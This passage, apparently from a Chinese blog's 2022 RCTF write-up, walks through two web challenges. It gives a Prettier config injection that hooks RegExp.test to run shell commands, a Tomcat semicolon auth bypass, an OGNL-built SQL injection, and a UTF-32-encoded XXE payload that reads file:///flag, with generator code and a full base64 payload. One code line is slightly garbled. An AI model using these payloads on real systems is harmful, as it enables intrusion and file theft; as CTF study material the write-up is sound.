class="comment">// 使用 nextTick 方法注册一个回调函数跑出一个错误</span></span><br><span class="line">  <span class="title function_">nextTick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No NextTick here!&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">    </span><br><span class="line">  <span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>主要是对一个文件进行格式化、哈希计算并生成新的文件。</p>
<p>在这段代码中我们发现</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">resolveConfig</span><span class="params">(`$&#123;__dirname&#125;/.prettierrc`)</span></span></span><br></pre></td></tr></table></figure>

<p>.prettierrc文件实际上是不在当前目录，也就是说还未生成，那么我们利用其自身格式代码，让其加载我们自己的设置配置信息，实现想要的命令执行等等操作</p>
<h3 id="fw-js"><a href="#fw-js" class="headerlink" title="fw.js"></a>fw.js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Module</span> = <span class="built_in">require</span>(<span class="string">&#x27;module&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> oldRequire = <span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">require</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">require</span> = <span class="keyword">function</span> (<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> id !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bye&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> isCore = <span class="title class_">Module</span>.<span class="title function_">isBuiltin</span>(id)</span><br><span class="line">  <span class="keyword">if</span> (isCore) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/fs|path|util|os/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bye, &#x27;</span> + id)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    id = <span class="title class_">Module</span>.<span class="title function_">_resolveFilename</span>(id, <span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> oldRequire.<span class="title function_">call</span>(oldRequire, id)</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="property">dlopen</span> = <span class="function">() =&gt;</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>看起来是对参数进行过滤的一个模块，首先判断参数<code>id</code>是否为字符串类型，如果不是，则会抛出一个错误。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="regexp">/fs|path|util|os/</span>.<span class="title function_">test</span>(id))</span><br></pre></td></tr></table></figure>

<p>这里用<code>test(id)</code>,如果<code>id</code>是一个Node.js的核心模块，如<code>fs</code>、<code>path</code>、<code>util</code>或<code>os</code>等，则允许加载该模块，否则也会抛出一个错</p>
<p>误</p>
<p>另外，<code>process.dlopen</code>被重写为空函数，代表无法使用<code>process.dlopen</code>加载新的本地模块</p>
<blockquote>
<p><code>process.dlopen</code>是Node.js的一个C++层面的函数，用于在Node.js进程中动态加载本地模块</p>
</blockquote>
<h3 id="js-payload"><a href="#js-payload" class="headerlink" title="js payload"></a>js payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">//解析.prettierrc</span></span><br><span class="line">  <span class="attr">parser</span>: <span class="string">&quot;.prettierrc&quot;</span>,</span><br><span class="line">  <span class="regexp">/x|x/</span>.<span class="property">__proto__</span>.<span class="property">test</span>=<span class="function">()=&gt;</span><span class="literal">true</span>,</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">exports</span>=<span class="function">()=&gt;</span><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;pwd;cat flag&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Hook RegExp.prototype.test</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这段代码的目的就是因为在目录下并没有<code>.prettierrc</code>配置文件，所以利用解析器解析<code>.prettierrc，</code></p>
<p>那么</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/x|x/</span>.__proto__.test=<span class="function"><span class="params">()</span>=&gt;</span><span class="literal">true</span>,</span><br><span class="line">module.<span class="built_in">exports</span>=<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;pwd;cat flag&quot;</span>).toString()</span><br></pre></td></tr></table></figure>

<p>中的内容就会被当作.prettierrc文件的内容，然后在index.js中进行解析，从而执行命令</p>
</blockquote>
<blockquote>
<p><code>parser: &quot;.prettierrc&quot;</code>：设置 Prettier 的解析器为 <code>.prettierrc</code>，这意味着 Prettier 会读取和解析 <code>.prettierrc</code> 文件来获取格式化选项。</p>
<p><code>/x|x/.__proto__.test=()=&gt;true</code>：通过修改 <code>RegExp</code> 对象的原型来劫持所有正则表达式的 <code>test()</code> 方法，使其始终返回为<code>true</code>这样就可以使得<code>id</code>绕过<code>fw.js</code>的过滤了，使得可以require任何东西，以至于<code>child_process</code>，正则表达式 <code>/x|x/</code> 可以匹配任何字符串。</p>
<p><code>module.exports=()=&gt;require(&quot;child_process&quot;).execSync(&quot;pwd;cat flag&quot;).toString()</code>：将 <code>module.exports</code> 设置为一个匿名函数，该函数调用一个子进程<code>child_process</code>，然后调用<code>execSync</code> 方法来执行命令 <code>pwd;cat flag</code>，并将当前目录<code>flag</code>作为字符串返回。</p>
</blockquote>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><blockquote>
<p>hint:xxe me,尝试编码绕过 xxe 过滤器</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123144129416.png"><img src="/2022RCTF/image-20230123144129416.png" alt="image-20230123144129416"></a></p>
<p>这是一道xxe的题目，对内容进行了过滤，可以对过滤内容进行编码绕过过滤达到文件内容读取的目的</p>
<p>反汇编jar包，</p>
<p>在<code>com.example.demo.filter.MyFilter</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (isWhite(request) || auth()) &#123;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      response.getWriter().write(<span class="string">&quot;auth fail&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWhite</span><span class="params">(ServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest)req;</span><br><span class="line">    <span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">auth</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里看到开始页面的<code>auth fail</code>的触发条件</p>
<p><code>if (isWhite(request) || auth())</code></p>
<p>其中</p>
<p><code>auth()</code>是一定返回<code>false</code></p>
<p>所以我们需要让<code>isWhite(request)</code>返回<code>true</code>，才能继续后续步骤</p>
<p>在isWhite()中可知</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要<code>URI</code>后以<code>ico</code>结尾，但是又不能访问一个不存在的文件，不然后面的访问都是失败的</p>
<p>这里就需要利用一个知识点</p>
<p><code>Tomcat 以;一种奇怪的方式进行规范化</code></p>
<p>也就是说在<code>;</code>后的不进行解析</p>
<p>于是构造出</p>
<p><code>http://127.0.0.1:8899/index;123.ico</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123151457117.png"><img src="/2022RCTF/image-20230123151457117.png" alt="image-20230123151457117"></a></p>
<p>虽然显示<code>500</code>，但其实是成功了的</p>
</blockquote>
<p>然后就需要考虑如何进行<code>xxe</code>注入</p>
<p>在<code>com.example.demo.controller.DemoController</code>中，正好有个名为<code>xxe</code>的函数</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123153904078.png"><img src="/2022RCTF/image-20230123153904078.png" alt="image-20230123153904078"></a></p>
<p>在<code>xxe</code>函数上面还有个<code>sayHello</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (password.length() &gt; <span class="number">50</span> || password.indexOf(<span class="string">&quot;&#x27;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;not allow&quot;</span>;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>发现其对<code>password</code>这个参数中的数据也进行了过滤，长度<code>不能超过50</code>个字符，且其中不能有单引号<code>&#39;</code></p>
<p>否则就会失败返回</p>
</blockquote>
<blockquote>
<p>并且在<code>sayHello</code>函数中，还有其他三个参数</p>
<p><code>String poc, String type, String yourclasses</code></p>
<p>这三个参数也是最后传入<code>xxe函数</code>的三个参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> xxe(poc, type, classes);</span><br></pre></td></tr></table></figure>

<p>【但是<code>yourclasses</code>参数被进行了分割，以<code>,</code>为分割，分成4份</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] classes = yourclasses.split(<span class="string">&quot;,&quot;</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<p>所以对<code>yourclasses</code>的参数赋值需要考虑</p>
</blockquote>
<blockquote>
<p>&#x3D;&#x3D;&gt;<code>xxe注入</code>需要四个参数</p>
<p><code>String password, String poc, String type, String yourclasses</code></p>
<p>其中</p>
<ul>
<li><code>password</code>参数值需要绕过单引号（常识猜测是sql注入，以单引号闭合，用万能密码</li>
<li><code>poc</code>参数值按常理应该就是xxe注入的内容</li>
<li><code>type</code>参数值还不太确定</li>
<li><code>yourclasses</code>参数值以<code>,</code>分割为4份，具体值可能就是帮助<code>poc</code>进行绕过过滤的</li>
</ul>
</blockquote>
<p>同样在该类中，底下就是过滤黑名单</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123154032645.png"><img src="/2022RCTF/image-20230123154032645.png" alt="image-20230123154032645"></a></p>
<blockquote>
<p>可以看到将<code>!DOCTYPE</code>进行了过滤</p>
</blockquote>
<h3 id="password参数"><a href="#password参数" class="headerlink" title="password参数"></a>password参数</h3><p>查找password参数在哪里被利用时</p>
<p>在<code>com.example.demo.mapper.UserProvider</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230124131633821.png"><img src="/2022RCTF/image-20230124131633821.png" alt="image-20230124131633821"></a></p>
<p>发现其果然被<code>sql</code>查询利用 ，以<code>&#39;)</code>闭合</p>
<p>但是单引号被过滤了如何闭合，然后实现万能密码呢</p>
<h4 id="Ognl-注入绕过引用过滤"><a href="#Ognl-注入绕过引用过滤" class="headerlink" title="Ognl 注入绕过引用过滤"></a>Ognl 注入绕过引用过滤</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">@java</span>.lang.Character<span class="meta">@toString(39)</span>&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>简而言之，<code>mybatis</code>会调用<code>OGNL parser</code>来解析<code>sql</code>语句中以 <code>$&#123;&#125;</code> 或者 <code>#&#123;&#125;</code> 中的表达式并将执行结果替换进去</p>
</blockquote>
<p>这里的<code>39</code>就是单引号的<code>ascii</code>编码</p>
<p>于是构造<code>sql</code>注入万能密码</p>
<blockquote>
<p><code>password=1</code><strong><code>$&#123;@java.lang.Character@toString(39)&#125;</code></strong><code>) or 1=1#</code></p>
</blockquote>
<h3 id="poc参数"><a href="#poc参数" class="headerlink" title="poc参数"></a>poc参数</h3><p>先分析一下<code>xxe</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">xxe</span><span class="params">(String b64poc, String type, String[] classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br><span class="line">    <span class="keyword">if</span> (check(bytepoc)) &#123;</span><br><span class="line">      <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">      <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">      <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">wrappoc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br><span class="line">      <span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br><span class="line">      inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br><span class="line">      <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>poc</code>传入后变为<code>b64poc</code></p>
<p>然后<code>b64poc</code>进行<code>base64</code>解码，然后<code>check</code>函数进行过滤<code>!DOCTYPE</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br></pre></td></tr></table></figure>

<p>这里就提及一个知识点xxe的编码绕过</p>
<blockquote>
<p>一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。</p>
</blockquote>
<p>而一般过滤都是单字符集过滤，利用上面的编码就可以绕过，而且利用上面方式加码的<code>xml</code>文档仍然可以被正常读取解析，</p>
<p>这里将其进行<code>UTF-16</code>加码，于是构造payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE test [ \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;\t&lt;!ENTITY xxe SYSTEM \&quot;file:///flag\&quot;&gt; \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;]&gt; \n&quot;</span>y</span><br><span class="line">                + <span class="string">&quot;&lt;ttoc&gt;&amp;xxe;&lt;/ttoc&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> <span class="string">&quot;UTF-32&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(body.getBytes(type)));</span><br><span class="line">        System.out.println(<span class="string">&quot;poc=&quot;</span>+poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后得到<code>poc</code>的参数值</p>
<blockquote>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA+AAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg==</code></p>
<p>但是发送请求包中<code>base64</code>编码，需要对数据再进行<code>url</code>编码，不然类型<code>=</code>或<code>+</code>会被视为<code>url</code>中的参数和空格符号</p>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D</code></p>
</blockquote>
<h3 id="type参数"><a href="#type参数" class="headerlink" title="type参数"></a>type参数</h3><p>在<code>xxe</code>函数中，对于<code>type</code>参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br></pre></td></tr></table></figure>

<p>似乎对于结果没什么影响，只是对<code>type</code>参数值为不为<code>string</code>时，对<code>wrappoc</code>值有变化【是<code>byte</code>类型的<code>poc</code>参数值，还是<code>string</code>类型的<code>poc</code>参数值】</p>
<p>但是<code>wrappoc</code>参数对后续结果没用影响，猜测<code>type</code>参数值应该可以顺便填，就按其代码赋值也行</p>
<blockquote>
<p><code>type=string</code></p>
</blockquote>
<h3 id="yourclasses参数"><a href="#yourclasses参数" class="headerlink" title="yourclasses参数"></a>yourclasses参数</h3><p><code>yourclasses</code>参数传入<code>xxe</code>函数时，以<code>classes</code>参数名</p>
<p>前面提到过,<code>yourclasses</code>参数以<code>,</code>为分割，分成四份</p>
<p>前两部分</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>后两部分</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>先分析一下</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/"><strong>java.lang.Class 类</strong></a>的**forName()**方法用于获取具有指定类名的该类的实例。此类名称指定为字符串参数</p>
<p>简而言之，<strong>Class.forName</strong> 方法的作用，就是初始化给定的类。</p>
</blockquote>
<h4 id="classes-0-classes-1"><a href="#classes-0-classes-1" class="headerlink" title="classes[0]&amp;classes[1]"></a>classes[0]&amp;classes[1]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码使用了反射机制。它首先使用 <code>Class.forName(classes[0])</code> 方法来获取类的 <code>Class</code> 对象。</p>
<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;)</code> 方法来获取该类的构造函数。</p>
<p>该方法的参数是一个 <code>Class</code> 数组，表示该构造函数的参数类型。在这里，该构造函数只有一个参数，且其参数的类型是 <code>classes[1]</code> 中所表示的类。最后将获取到的构造函数赋值给 <code>constructor</code> 变量。</p>
<blockquote>
<p>反射机制是 Java 编程语言中一种用于获取类、接口、构造方法、字段、方法等信息的机制。反射机制允许程序在运行时动态地获取、使用、操作类的相关信息。</p>
</blockquote>
</blockquote>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<blockquote>
<p><code>classes[0]</code>：</p>
<p>这个是看其他大佬wp清楚了，这里赋值字节数组 <code>java.io.ByteArrayInputStream</code>,然后<code>bytepoc</code>通过<strong>ByteArrayInputStream转换为输入流</strong>，因为其类中有<code>read()</code>可以读取数据</p>
<p><code>classes[1]</code>：</p>
<p>是数组参数数据类型，根据数组参数类型”<code>[B</code>“ 是表示字节数组<code>byte[]</code> (byte array) 的类型名称。</p>
<blockquote>
<p>在 java 中，数组类型的类型名称会在前面加上 “[“ 符号表示，比如<code>[I</code>代表 int 类型的数组类型名称，但是由于string不是基本数据类型，只能用类表示<code>[Ljava.lang.String;</code></p>
</blockquote>
</blockquote>
<p><strong>所以</strong></p>
<blockquote>
<p><code>classes[0]=java.io.ByteArrayInputStream</code></p>
<p><code>classes[1]=[B</code>   (因为<code>bytepoc</code>为<code>byte</code>数据类型，所以这里传入<code>ByteArrayInputStream</code>类中的构造函数的参数类型也声明为<code>byte</code></p>
</blockquote>
<h4 id="classes-2-classes-3"><a href="#classes-2-classes-3" class="headerlink" title="classes[2]&amp;classes[3]"></a>classes[2]&amp;classes[3]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>这里的<code>inputSource</code>参数是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line">...</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>



